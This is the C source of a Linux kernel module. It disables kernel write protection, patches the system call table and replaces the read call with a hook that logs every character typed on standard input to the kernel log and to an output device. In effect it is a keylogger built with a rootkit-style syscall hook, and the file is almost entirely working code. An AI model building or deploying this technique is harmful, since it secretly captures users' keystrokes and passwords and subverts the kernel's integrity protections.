//TODO: stop including these everywhere..
#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

#include "environmentSpecificOptions.h"
#include "logInput.h"
#include "outputDevice.h"

void **syscallTable = (void **) SYSCALL_TABLE;
void (*pages_rw)(struct page *page, int numpages) = PAGES_RW;
void (*pages_ro)(struct page *page, int numpages) = PAGES_RO;

struct page *syscallPageTemp;

asmlinkage int (*originalRead)(int, void*, size_t);

asmlinkage int readHook(int fd, void* buf, size_t nbytes)
{
	int result;
	result = (*originalRead)(fd, buf, nbytes);
	if (fd==0)
	{	
		
	//printk("\n");
	printk ("%c\n", (((char *) buf)[0]));
	
	{
		char *bufferAsCharacterAnArray = (char *) buf;
		char ch = bufferAsCharacterAnArray[0];
		addCharacterToOutputDevice(ch);
	}
		//printk("stdin read\n");
	//printk("bytes read = %d\n", (int) nbytes);
	}
	return result;
} 


int __init logInput_init(void) {	
	write_cr0 (read_cr0 () & (~ 0x10000));
	syscallPageTemp = virt_to_page(syscallTable);
	pages_rw(syscallPageTemp, 1);

	originalRead = syscallTable[__NR_read];
	syscallTable[__NR_read] = readHook;

	write_cr0 (read_cr0 () | 0x10000);
//	addToOutputDevice("Logging input!");
	return 0;
//blah
}

void __exit logInput_exit(void) {
	 // unimplemented
	
	write_cr0 (read_cr0 () & (~ 0x10000));
	syscallPageTemp = virt_to_page(syscallTable);
	syscallTable[__NR_read] = originalRead;
	pages_ro(syscallPageTemp, 1);
	write_cr0 (read_cr0 () | 0x10000);
	printk(KERN_ALERT "MODULE EXIT\n");
	return;
}
